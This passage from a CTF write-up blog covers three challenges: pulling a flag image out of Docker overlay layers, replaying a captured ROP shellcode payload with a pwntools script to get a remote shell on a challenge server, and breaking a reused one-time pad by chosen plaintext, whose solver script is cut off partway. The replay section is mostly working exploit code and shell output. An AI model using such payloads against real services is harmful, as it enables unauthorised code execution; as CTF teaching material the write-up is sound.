<span class="go">ls: cannot open directory '.': Permission denied
</span></code></pre></div></div>
<ul>
  <li>Trying this with elevated permissions, then searching via find for flag.png yields:</li>
</ul>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">‚îå‚îÄ‚îÄ(shinris3n„âøkodachi)-[/var/lib/docker/overlay2]
</span><span class="gp">‚îî‚îÄ$</span><span class="w"> </span><span class="nb">sudo ls</span> <span class="nt">-al</span> /var/lib/docker/overlay2/                                                                                          
<span class="go">total 76
drwx-----x 19 root root 4096 Oct 24 20:51 .
drwx--x--x 14 root root 4096 Sep 18 15:58 ..
drwx-----x  3 root root 4096 Jun  5 17:36 0c8211388805bd110c14a5156da4abefe9237cd11050d179f6870f092de974a7
drwx-----x  4 root root 4096 Jun  5 17:36 1d678d5825ea88e14b70dab71f24b46fbff22643294b4be6a0672632f188e68f
drwx-----x  3 root root 4096 Oct 24 20:49 6486d308eb4271abb881399b0f032c264a0296ad7612a1a82b41488a52eab8bb
drwx-----x  4 root root 4096 Oct 24 20:51 7b89f934aa1d9b1286d9ff09037b8f4cd25f3116e9ebdd30aa89b5be18fb01cd
drwx-----x  4 root root 4096 Oct 24 20:51 7b89f934aa1d9b1286d9ff09037b8f4cd25f3116e9ebdd30aa89b5be18fb01cd-init
drwx-----x  4 root root 4096 Oct 24 20:52 85850942fb425900d8354347b0f0233a63ddd8c226d88400138a740323d43569
drwx-----x  4 root root 4096 Oct 24 20:51 85850942fb425900d8354347b0f0233a63ddd8c226d88400138a740323d43569-init
drwx-----x  4 root root 4096 Jun  5 17:44 9a3d5ee146d1f52b551c49977384f451e1f1a9fb9f7a52ea055a6439f6c5dfe8
drwx-----x  4 root root 4096 Jun  5 17:36 9a3d5ee146d1f52b551c49977384f451e1f1a9fb9f7a52ea055a6439f6c5dfe8-init
drwx-----x  4 root root 4096 Oct 24 20:49 a53ad803fcada3d5c4c3ad52b01d540c8d8a9358a46662dede804860ca9eba93
drwx-----x  4 root root 4096 Jun  5 17:36 a76762e01180981bc7f9cf2ce77627c151d1155c2d7fa023a44c467d09493cd7
drwx-----x  4 root root 4096 Oct 24 20:49 aa2bcbd0951a0e898cb73e412ab47c09d77fc753c0947022e1fb0edfcc3cc08a
drwx-----x  4 root root 4096 Jun  5 17:36 ae4f50325c02c2387e3b39a797391617a633d3bc4144c5bb0b188b98b1ed2ba8
drwx-----x  4 root root 4096 Oct 24 20:51 b93b559c421b5ec21015b2339e968457bcdbd7703f8c4181c6403db220ba7d5c
drwx-----x  4 root root 4096 Jun  5 17:36 f9b87476e0cbfa8f0fab138781000c9f3c802e3350017e9facb9316feb4d44b1
drwx-----x  4 root root 4096 Jun  5 17:36 f9beca8f465f8ed70023d2297d975c6cd6b5a1490df9cf46c91627d0bd470538
drwx-----x  2 root root 4096 Oct 24 20:51 l

‚îå‚îÄ‚îÄ(shinris3n„âøkodachi)-[/var/lib/docker/overlay2]
</span><span class="gp">‚îî‚îÄ$</span><span class="w"> </span><span class="nb">sudo </span>find <span class="nt">-name</span> <span class="s2">"flag.png"</span>
<span class="go">./aa2bcbd0951a0e898cb73e412ab47c09d77fc753c0947022e1fb0edfcc3cc08a/diff/flag.png
./a53ad803fcada3d5c4c3ad52b01d540c8d8a9358a46662dede804860ca9eba93/diff/flag.png
</span></code></pre></div></div>
<ul>
  <li>Trying to copy these files over to our home directory and opening them up is only successful for one of the two files.  (Inspecting the one that failed, the flag.png file appears to have the ‚Äúc‚Äù (Character Device / Special File) permission set, which is not readable).</li>
</ul>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">‚îå‚îÄ‚îÄ(shinris3n„âøkodachi)-[~/sec/CTFs/BuckeyeCTF2021/misc/layers]
</span><span class="gp">‚îî‚îÄ$</span><span class="w"> </span><span class="nb">sudo cp</span> /var/lib/docker/overlay2/aa2bcbd0951a0e898cb73e412ab47c09d77fc753c0947022e1fb0edfcc3cc08a/diff/flag.png ./flag1.png    
<span class="go">
‚îå‚îÄ‚îÄ(shinris3n„âøkodachi)-[~/sec/CTFs/BuckeyeCTF2021/misc/layers]
</span><span class="gp">‚îî‚îÄ$</span><span class="w"> </span><span class="nb">sudo cp</span> /var/lib/docker/overlay2/a53ad803fcada3d5c4c3ad52b01d540c8d8a9358a46662dede804860ca9eba93/diff/flag.png ./flag2.png
<span class="go">cp: cannot open '/var/lib/docker/overlay2/a53ad803fcada3d5c4c3ad52b01d540c8d8a9358a46662dede804860ca9eba93/diff/flag.png' for reading: No such device or address

‚îå‚îÄ‚îÄ(shinris3n„âøkodachi)-[~/sec/CTFs/BuckeyeCTF2021/misc/layers]
</span><span class="gp">‚îî‚îÄ$</span><span class="w"> </span><span class="nb">sudo ls</span> <span class="nt">-al</span> /var/lib/docker/overlay2/a53ad803fcada3d5c4c3ad52b01d540c8d8a9358a46662dede804860ca9eba93/diff/                    
<span class="go">total 8
drwxr-xr-x 2 root root 4096 Oct 24 20:49 .
drwx-----x 4 root root 4096 Oct 24 20:49 ..
c--------- 1 root root 0, 0 Oct 24 20:49 flag.png
</span></code></pre></div></div>
<ul>
  <li>Opening the file that successfully copied over (flag1.png) yields the flag:</li>
</ul>

<p><img src="/assets/writeups/BuckeyeCTF2021/373e23d292d39718b55e9934358780e0.png" alt="373e23d292d39718b55e9934358780e0.png" /></p>

<ul>
  <li>We can now clean up any docker containers that are still running along with the image:</li>
</ul>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">‚îå‚îÄ‚îÄ(shinris3n„âøkodachi)-[~/sec/CTFs/BuckeyeCTF2021/misc/layers]
</span><span class="gp">‚îî‚îÄ$</span><span class="w"> </span>docker ps <span class="nt">-a</span>                                                                                                                  
<span class="go">CONTAINER ID   IMAGE                  COMMAND                  CREATED          STATUS                        PORTS     NAMES
6e978af16952   qxxxb/layers           "/bin/sh"                57 minutes ago   Exited (130) 56 minutes ago             thirsty_rubin
d57ae7d74a36   qxxxb/layers           "/bin/sh"                57 minutes ago   Exited (0) 57 minutes ago               strange_bell

‚îå‚îÄ‚îÄ(shinris3n„âøkodachi)-[~/sec/CTFs/BuckeyeCTF2021/misc/layers]
</span><span class="gp">‚îî‚îÄ$</span><span class="w"> </span>docker <span class="nb">rm </span>thirsty_rubin                                                                                                       
<span class="go">thirsty_rubin 

‚îå‚îÄ‚îÄ(shinris3n„âøkodachi)-[~/sec/CTFs/BuckeyeCTF2021/misc/layers]
</span><span class="gp">‚îî‚îÄ$</span><span class="w"> </span>docker <span class="nb">rm </span>strange_bell                                                                                                         
<span class="go">strange_bell

‚îå‚îÄ‚îÄ(shinris3n„âøkodachi)-[~/sec/CTFs/BuckeyeCTF2021/misc/layers]
</span><span class="gp">‚îî‚îÄ$</span><span class="w"> </span>docker rmi qxxxb/layers
<span class="go">Untagged: qxxxb/layers:latest
Untagged: qxxxb/layers@sha256:a89678536727abc0fbfe693b19ac0f8454502351dc792dabbee47bc9ab7420b2
Deleted: sha256:0c01a25ae5b745b06c68c7b870b848f327227e06feca8f121c105d3cc423ebc9
Deleted: sha256:34019abf87be9b68f1c90cc76b3d0c0b1c44aeb562f7745a54e1a47caf94f310
Deleted: sha256:fb972cfd15deb064bddfb9b7ed3718a78539b569f7cb604d7472ba64910cf9c8
Deleted: sha256:6d6c9aade1a3240edecab64e3d7ab6eeef677ef9570992191d55ccaab1039e4e
Deleted: sha256:e2eb06d8af8218cfec8210147357a68b7e13f7c485b991c288c2d01dc228bb68
</span></code></pre></div></div>]]></content><author><name>shinris3n</name></author><category term="[&quot;writeups&quot;]" /><category term="BuckeyeCTF2021" /><category term="docker" /><summary type="html"><![CDATA[Challenge Text:]]></summary></entry><entry><title type="html">replay</title><link href="http://0.0.0.0:4000/writeups/2021/10/24/Buckeye2021-replay.html" rel="alternate" type="text/html" title="replay" /><published>2021-10-24T21:31:21-05:00</published><updated>2021-10-24T21:31:21-05:00</updated><id>http://0.0.0.0:4000/writeups/2021/10/24/Buckeye2021-replay</id><content type="html" xml:base="http://0.0.0.0:4000/writeups/2021/10/24/Buckeye2021-replay.html"><![CDATA[<h1></h1>
<h3><font color="FF3030"> Challenge Text: </font></h3>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">Author: qxxxb

Somebody pwned my app! Luckily I managed to capture the network traffic of their exploit.
Oh by the way, the same app is also running on misc.chall.pwnoh.io on port 13371. 
Can you pwn it for me?
</span></code></pre></div></div>
<h3><font color="FF3030"> Solution: </font></h3>

<ul>
  <li>Let‚Äôs first connect to the app ourselves to see what the interaction looks like:</li>
</ul>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">‚îå‚îÄ‚îÄ(shinris3n„âøkodachi)-[~/sec/CTFs/BuckeyeCTF2021/misc/replay]
</span><span class="gp">‚îî‚îÄ$</span><span class="w"> </span>nc misc.chall.pwnoh.io 13371
<span class="go">HELLO HOW ARE YOU DOING TODAY
Fantastic!
</span></code></pre></div></div>
<ul>
  <li>Analyzing the pcap that we are provided using Wireshark, we can follow the TCP stream to see what was being sent and received.  This can be done by clicking the entry and navigating the menu options to Follow -&gt; TCP Stream:</li>
</ul>

<p><img src="/assets/writeups/BuckeyeCTF2021/fda98c019234993fa2d0372ba431002a.png" alt="fda98c019234993fa2d0372ba431002a.png" /></p>

<p><img src="/assets/writeups/BuckeyeCTF2021/704d1f854245ddf00df5ba2ccecd17e6.png" alt="704d1f854245ddf00df5ba2ccecd17e6.png" /></p>

<ul>
  <li>Comparing this to what we saw when we first connected to the app, it looks like some shellcode was sent across to exploit the app successfully.  We can see the hex bytes for this shellcode by setting the ‚ÄúShow data as‚Äù field to ‚ÄúRaw‚Äù:</li>
</ul>

<p><img src="/assets/writeups/BuckeyeCTF2021/aa6d3e14537b51c7ca8e5fe361b13256.png" alt="aa6d3e14537b51c7ca8e5fe361b13256.png" /></p>

<ul>
  <li>Now we‚Äôre able to write our own exploit script, using this as a payload.   Below is a Python3 implementation of such a script, leveraging the pwntools CTF toolkit to make catching and handling the command shell our payload spawns easier.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># BuckEyeCTF 2021 - Replay
# shinris3n/NINPWN
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span> <span class="c1"># pip3 install pwn
</span>
<span class="c1"># Open up connection.
</span><span class="n">address</span> <span class="o">=</span> <span class="s">'misc.chall.pwnoh.io'</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">13371</span>
<span class="n">tcpsocket</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>

<span class="c1"># Receive server input request
</span><span class="k">print</span><span class="p">(</span><span class="n">tcpsocket</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)))</span>

<span class="c1"># Define payload from wireshark capture
</span><span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x61\x61\x61\x61\x62\x61\x61\x61\x63\x61\x61\x61\x64\x61\x61\x61\x65\x61\x61\x61\x66\x61\x61\x61\x67\x61\x61\x61\x68\x61\x61\x61\x69\x61\x61\x61\x6a\x61\x61\x61\x6b\x61\x61\x61\x6c\x61\x61\x61\x6d\x61\x61\x61\x6e\x61\x61\x61\x6f\x61\x61\x61\x70\x61\x61\x61\x71\x61\x61\x61\x72\x61\x61\x61\x73\x61\x61\x61\x74\x61\x61\x61\x75\x61\x61\x61\x76\x61\x61\x61\x77\x61\x61\x61\x78\x61\x61\x61\x79\x61\x61\x61\x7a\x61\x61\x62\x62\x61\x61\x62\x63\x61\x61\x62\x64\x61\x61\x62\x65\x61\x61\x62\x66\x61\x61\x62\x67\x61\x61\x62\x68\x61\x61\x62\x69\x61\x61\x62\x55\x11\x40\x00\x00\x00\x00\x00\x0f\x00\x00\x00\x00\x00\x00\x00\x57\x11\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x20\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x3b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x57\x11\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x33\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0a</span><span class="s">"</span>

<span class="c1"># Encode and send payload
</span><span class="n">tcpsocket</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">))</span>
<span class="k">print</span> <span class="p">(</span><span class="s">'Sent: 0x'</span> <span class="o">+</span> <span class="n">binascii</span><span class="p">.</span><span class="n">hexlify</span><span class="p">(</span><span class="n">payload</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)).</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">))</span>

<span class="c1"># Catch the shell
</span><span class="n">tcpsocket</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>
<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">‚îå‚îÄ‚îÄ(shinris3n„âøkodachi)-[~/sec/CTFs/BuckeyeCTF2021/misc/replay]
</span><span class="gp">‚îî‚îÄ$</span><span class="w"> </span>python3 ./replay.py 
<span class="go">[+] Opening connection to misc.chall.pwnoh.io on port 13371: Done
b'HELLO HOW ARE YOU DOING TODAY\n'
Sent: 0x6161616162616161636161616461616165616161666161616761616168616161696161616a6161616b6161616c6161616d6161616e6161616f616161706161617161616172616161736161617461616175616161766161617761616178616161796161617a616162626161626361616264616162656161626661616267616162686161626961616255114000000000000f0000000000000057114000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000042040000000000000000000000000000000000000000000000000000000000000000000000000003b000000000000000000000000000000000000000000000057114000000000000000000000000000330000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a
[*] Switching to interactive mode
</span><span class="gp">$</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">chall
flag.txt
</span><span class="gp">$</span><span class="w"> </span><span class="nb">cat </span>flag.txt
<span class="go">buckeye{g00d_th1ng_P1E_w4s_d1s4bl3d_0n_th3_b1n4ry}
</span></code></pre></div></div>
<ul>
  <li>As an aside, pwntools has a neat debugging feature as well that can help if your shellcode isn‚Äôt quite working the way you want it to and you need some more information about what you‚Äôre actually sending across:</li>
</ul>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">‚îå‚îÄ‚îÄ(shinris3n„âøkodachi)-[~/sec/CTFs/BuckeyeCTF2021/misc/replay]
</span><span class="gp">‚îî‚îÄ$</span><span class="w"> </span>python3 ./replay.py DEBUG
<span class="go">[+] Opening connection to misc.chall.pwnoh.io on port 13371: Done
[DEBUG] Received 0x1e bytes:
    b'HELLO HOW ARE YOU DOING TODAY\n'
b'HELLO HOW ARE YOU DOING TODAY\n'
[DEBUG] Sent 0x19a bytes:
    00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  ‚îÇaaaa‚îÇbaaa‚îÇcaaa‚îÇdaaa‚îÇ
    00000010  65 61 61 61  66 61 61 61  67 61 61 61  68 61 61 61  ‚îÇeaaa‚îÇfaaa‚îÇgaaa‚îÇhaaa‚îÇ
    00000020  69 61 61 61  6a 61 61 61  6b 61 61 61  6c 61 61 61  ‚îÇiaaa‚îÇjaaa‚îÇkaaa‚îÇlaaa‚îÇ
    00000030  6d 61 61 61  6e 61 61 61  6f 61 61 61  70 61 61 61  ‚îÇmaaa‚îÇnaaa‚îÇoaaa‚îÇpaaa‚îÇ
    00000040  71 61 61 61  72 61 61 61  73 61 61 61  74 61 61 61  ‚îÇqaaa‚îÇraaa‚îÇsaaa‚îÇtaaa‚îÇ
    00000050  75 61 61 61  76 61 61 61  77 61 61 61  78 61 61 61  ‚îÇuaaa‚îÇvaaa‚îÇwaaa‚îÇxaaa‚îÇ
    00000060  79 61 61 61  7a 61 61 62  62 61 61 62  63 61 61 62  ‚îÇyaaa‚îÇzaab‚îÇbaab‚îÇcaab‚îÇ
    00000070  64 61 61 62  65 61 61 62  66 61 61 62  67 61 61 62  ‚îÇdaab‚îÇeaab‚îÇfaab‚îÇgaab‚îÇ
    00000080  68 61 61 62  69 61 61 62  55 11 40 00  00 00 00 00  ‚îÇhaab‚îÇiaab‚îÇU¬∑@¬∑‚îÇ¬∑¬∑¬∑¬∑‚îÇ
    00000090  0f 00 00 00  00 00 00 00  57 11 40 00  00 00 00 00  ‚îÇ¬∑¬∑¬∑¬∑‚îÇ¬∑¬∑¬∑¬∑‚îÇW¬∑@¬∑‚îÇ¬∑¬∑¬∑¬∑‚îÇ
    000000a0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  ‚îÇ¬∑¬∑¬∑¬∑‚îÇ¬∑¬∑¬∑¬∑‚îÇ¬∑¬∑¬∑¬∑‚îÇ¬∑¬∑¬∑¬∑‚îÇ
    *
    00000100  00 00 00 00  00 00 00 00  04 20 40 00  00 00 00 00  ‚îÇ¬∑¬∑¬∑¬∑‚îÇ¬∑¬∑¬∑¬∑‚îÇ¬∑ @¬∑‚îÇ¬∑¬∑¬∑¬∑‚îÇ
    00000110  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  ‚îÇ¬∑¬∑¬∑¬∑‚îÇ¬∑¬∑¬∑¬∑‚îÇ¬∑¬∑¬∑¬∑‚îÇ¬∑¬∑¬∑¬∑‚îÇ
    *
</span><span class="gp">    00000130  3b 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  ‚îÇ;</span>¬∑¬∑¬∑‚îÇ¬∑¬∑¬∑¬∑‚îÇ¬∑¬∑¬∑¬∑‚îÇ¬∑¬∑¬∑¬∑‚îÇ
<span class="go">    00000140  00 00 00 00  00 00 00 00  57 11 40 00  00 00 00 00  ‚îÇ¬∑¬∑¬∑¬∑‚îÇ¬∑¬∑¬∑¬∑‚îÇW¬∑@¬∑‚îÇ¬∑¬∑¬∑¬∑‚îÇ
    00000150  00 00 00 00  00 00 00 00  33 00 00 00  00 00 00 00  ‚îÇ¬∑¬∑¬∑¬∑‚îÇ¬∑¬∑¬∑¬∑‚îÇ3¬∑¬∑¬∑‚îÇ¬∑¬∑¬∑¬∑‚îÇ
    00000160  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  ‚îÇ¬∑¬∑¬∑¬∑‚îÇ¬∑¬∑¬∑¬∑‚îÇ¬∑¬∑¬∑¬∑‚îÇ¬∑¬∑¬∑¬∑‚îÇ
    *
    00000190  00 00 00 00  00 00 00 00  0a 0a                     ‚îÇ¬∑¬∑¬∑¬∑‚îÇ¬∑¬∑¬∑¬∑‚îÇ¬∑¬∑‚îÇ
    0000019a
Sent: 0x6161616162616161636161616461616165616161666161616761616168616161696161616a6161616b6161616c6161616d6161616e6161616f616161706161617161616172616161736161617461616175616161766161617761616178616161796161617a616162626161626361616264616162656161626661616267616162686161626961616255114000000000000f0000000000000057114000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000042040000000000000000000000000000000000000000000000000000000000000000000000000003b000000000000000000000000000000000000000000000057114000000000000000000000000000330000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a
[*] Switching to interactive mode
</span><span class="gp">$</span><span class="w"> </span><span class="nb">cat </span>flag.txt
<span class="go">[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x33 bytes:
    b'buckeye{g00d_th1ng_P1E_w4s_d1s4bl3d_0n_th3_b1n4ry}\n'
buckeye{g00d_th1ng_P1E_w4s_d1s4bl3d_0n_th3_b1n4ry}
</span><span class="gp">$</span><span class="w"> 
</span><span class="go">[*] Interrupted
[*] Closed connection to misc.chall.pwnoh.io port 13371
</span></code></pre></div></div>]]></content><author><name>shinris3n</name></author><category term="[&quot;writeups&quot;]" /><category term="BuckeyeCTF2021" /><category term="Wireshark" /><category term="pwntools" /><summary type="html"><![CDATA[Challenge Text:]]></summary></entry><entry><title type="html">N1TP</title><link href="http://0.0.0.0:4000/writeups/2021/09/18/HacktivityCon2021-N1TP.html" rel="alternate" type="text/html" title="N1TP" /><published>2021-09-18T17:25:21-05:00</published><updated>2021-09-18T17:25:21-05:00</updated><id>http://0.0.0.0:4000/writeups/2021/09/18/HacktivityCon2021-N1TP</id><content type="html" xml:base="http://0.0.0.0:4000/writeups/2021/09/18/HacktivityCon2021-N1TP.html"><![CDATA[<h1></h1>
<h3><font color="FF3030"> Challenge Text: </font></h3>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">Author: @JohnHammond#</span>6971
<span class="go">
Nina found some new encryption scheme that she apparently thinks is really cool. She's annoying but she found a flag or something, can you deal with her?

Connect with:

nc challenge.ctf.games 31921
</span></code></pre></div></div>
<h3><font color="FF3030"> Solution: </font></h3>

<ul>
  <li>Connecting to the service, we are provided with the encrypted flag and allowed to encrypt any string we like.  For this competition, we know that the flag is 32 characters in the format ‚Äúflag{0-9a-f}‚Äù, so we can check out what ‚Äúflag{‚Äú maps to:</li>
</ul>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">‚îå‚îÄ‚îÄ(shinris3n„âøkodachi)-[~]
</span><span class="gp">‚îî‚îÄ$</span><span class="w"> </span>nc challenge.ctf.games 31921
<span class="go">NINA: Hello! I found a flag, look!
      2b372f6747ea6adc33cd0f71ced9f039c3d803dd36c610eddc16007d63b73d1cd2c5876a01d8
NINA: But I encrypted it with a very special nonce, the same length as 
      the flag! I heard people say this encryption method is unbreakable!
      I'll even let you encrypt something to prove it!! What should we encrypt?
</span><span class="gp">&gt;</span><span class="w"> </span><span class="nb">test</span>
<span class="go">NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?
      393e3d7448b62b9f71cb18678d8ae27ed3d946cb73c556ab9b41433074b6770b96c1c52f17c0
NINA: Isn't that cool!?! Want to see it again? 
      Sorry, I forget already -- what was it you wanted to see again?
</span><span class="gp">&gt;</span><span class="w"> </span>flag<span class="o">{</span>
<span class="go">NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?
      2b372f6747b5348a62d50d7f9888ea6ccbdd52c461cc44b894425c2567a8621383c3cd3d0fc4
NINA: Isn't that cool!?! Want to see it again? 
      Sorry, I forget already -- what was it you wanted to see again?
</span></code></pre></div></div>
<ul>
  <li>
    <p>The output does indeed seem to indicate that a one time pad is being used‚Ä¶ except it is the same pad being used for every string we enter.  It also appears that each character we enter is mapped to a hexadecimal value.  We can assume these things because we input a five character string and saw that the first 10 characters of the encrypted string we received back were the same as the first 10 characters of the flag we were provided when we connected to the service.</p>
  </li>
  <li>
    <p>If we disconnect from the service and re-connect, however, the pad appears to change:</p>
  </li>
</ul>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">‚îå‚îÄ‚îÄ(shinris3n„âøkodachi)-[~]
</span><span class="gp">‚îî‚îÄ$</span><span class="w"> </span>nc challenge.ctf.games 31921
<span class="go">NINA: Hello! I found a flag, look!
      11fdfea632c2fe3807fcbdc68360e71166db3e57509c9880fba21cbb35f24fe5e68728d5cf00
NINA: But I encrypted it with a very special nonce, the same length as 
      the flag! I heard people say this encryption method is unbreakable!
      I'll even let you encrypt something to prove it!! What should we encrypt?
</span><span class="gp">&gt;</span><span class="w"> </span><span class="nb">test</span>
<span class="go">NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?
      03f4ecb53d9ebf7b45faaad0c033f55676da7b41159fdec6bcf55ff622f305f2a2836a90d918
NINA: Isn't that cool!?! Want to see it again? 
      Sorry, I forget already -- what was it you wanted to see again?
</span><span class="gp">&gt;</span><span class="w"> </span>flag<span class="o">{</span>
<span class="go">NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?
      11fdfea6329da06e56e4bfc8d531fd446ede6f4e0796ccd5b3f640e331ed10eab7816282c11c
NINA: Isn't that cool!?! Want to see it again? 
      Sorry, I forget already -- what was it you wanted to see again?
</span></code></pre></div></div>
<ul>
  <li>
    <p>One approach is to brute force this challenge by staying connected and interacting with the service, cycling through the possible flag values and matching hexidecimal values until we determine what the flag is.</p>
  </li>
  <li>
    <p>The brute force method is easy enough to use to solve this, but as it turns out this really is just a standard one-time pad implementation (with no twists).  We should therefore be able to get the key by simply passing along any value equal to the key length (which we were told was the same length as the flag when we first connected to the service).  Next, we can just XOR the plaintext we chose with the encrypted response we received to get the key.  Finally, we XOR the encrypted flag with the key and receive the plaintext flag!  Trying this out:</p>
  </li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># H@cktivityCon 2021 - N1TP Solution (Finding the Key with Chosen Plaintext)
# shinris3n
</span>
<span class="kn">import</span> <span class="nn">socket</span>

<span class="n">address</span> <span class="o">=</span> <span class="s">'challenge.ctf.games'</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">30966</span>
<span class="nb">buffer</span> <span class="o">=</span> <span class="mi">4096</span>

<span class="c1"># The encrypted flag received from "NINA" after connecting to the service.
</span><span class="n">encrypted_flag</span> <span class="o">=</span> <span class="s">''</span>

<span class="c1"># Send over plaintext of equal length to the key (which equals the flag length)
</span><span class="n">input_to_encrypt</span> <span class="o">=</span> <span class="s">'flag{0123456789abcdef0123456789abcdef}'</span>

<span class="n">received_data</span> <span class="o">=</span> <span class="s">''</span>

<span class="c1"># Open up connection.
</span><span class="n">tcpsocket</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">tcpsocket</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">address</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>

<span class="c1"># Get greeting.
</span><span class="n">received_data</span> <span class="o">=</span> <span class="n">tcpsocket</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="nb">buffer</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
<span class="k">print</span> <span class="p">(</span><span class="n">received_data</span><span class="p">)</span>

<span class="c1"># Retrieve and store the encrypted flag. 
</span><span class="n">received_data</span> <span class="o">=</span> <span class="n">tcpsocket</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="nb">buffer</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
<span class="n">encrypted_flag</span> <span class="o">=</span> <span class="n">received_data</span><span class="p">[</span><span class="mi">6</span><span class="p">:</span><span class="mi">82</span><span class="p">]</span> <span class="c1"># The flag appears to be hex formatted, 64 characters plus 12 characters for the flag{} portion, and 6 spaces of padding.
</span><span class="k">print</span> <span class="p">(</span><span class="s">'Encrypted Flag:'</span><span class="p">,</span> <span class="n">encrypted_flag</span><span class="p">)</span>

<span class="c1"># Send input to encrypt in flag format.
</span><span class="n">formatted_data_to_send</span> <span class="o">=</span> <span class="p">(</span><span class="n">input_to_encrypt</span> <span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
<span class="n">tcpsocket</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">formatted_data_to_send</span><span class="p">)</span>
<span class="k">print</span> <span class="p">(</span><span class="s">'Data sent:'</span><span class="p">,</span> <span class="n">input_to_encrypt</span><span class="p">)</span>

<span class="c1"># Get and store encrypted response.
</span><span class="n">received_data</span> <span class="o">=</span> <span class="n">tcpsocket</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="nb">buffer</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span> <span class="c1"># Get flavor text
</span><span class="k">print</span> <span class="p">(</span><span class="n">received_data</span><span class="p">)</span>
